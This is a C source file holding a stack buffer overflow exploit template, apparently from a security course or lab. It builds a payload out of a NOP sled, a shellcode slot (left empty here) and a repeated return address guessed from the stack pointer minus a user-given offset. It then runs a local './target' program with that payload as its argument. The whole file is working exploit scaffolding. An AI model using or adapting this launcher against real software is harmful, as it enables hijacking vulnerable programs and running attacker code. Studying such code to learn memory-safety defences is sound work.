#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <unistd.h>


// put the shellcode here in binary form: "\xAA\xBB..."
char shellcode[] = "";

#define NOP 0x90

unsigned long get_esp(void) { __asm__("movl %esp,%eax"); }

void main(int argc, char* argv[]) {
	assert(argc == 2);

	int payload_size = 150;			// size of our long payload
	int offset = atoi(argv[1]);		// offset to our ESP

	char* payload = malloc(payload_size);

	long addr = get_esp() - offset;
	fprintf(stderr, "Using address:  0x%lx\n", addr);

	// write the address everywhere
	for (int i = 0; i < payload_size/4; i++)
		((long*)payload)[i] = addr;

	// write NOP in the first half
	for (int i = 0; i < payload_size/2; i++)
		payload[i] = NOP;

	// the shellcode in the middle
	int start = payload_size/2 - strlen(shellcode)/2;
	for (int i = 0; i < strlen(shellcode); i++)
		payload[i + start] = shellcode[i];

	// 0 only at the very end
	payload[payload_size - 1] = '\0';

	// run target with payload as argument
	char* target_argv[] = { "./target", payload, NULL };
	execv(target_argv[0], target_argv);
}